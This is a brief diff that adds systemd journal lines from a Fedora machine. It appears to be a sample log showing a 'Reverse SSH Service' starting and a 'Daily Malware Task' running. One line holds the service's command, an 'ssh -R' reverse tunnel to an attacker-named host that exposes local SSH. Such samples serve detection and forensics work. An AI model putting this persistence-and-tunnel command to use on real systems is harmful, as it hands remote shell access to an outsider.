@@ -1,0 +1,6 @@
+Jan 29 06:11:02 fedora systemd[1]: Created slice user-999.slice.
+Jan 29 06:11:03 fedora systemd[1]: Started Reverse SSH Service.
+Jan 29 06:11:03 fedora systemd[1]: /etc/systemd/system/rshell.service: Executable path is not absolute, ignoring: ssh -R 2222:localhost:22 attacker@198.51.100.59
+Jan 29 06:11:04 fedora systemd[1]: Reloading.
+Jan 29 06:11:05 fedora systemd[1]: Starting Daily Malware Task...
+Jan 29 06:11:05 fedora systemd[1]: Started Daily Malware Task.
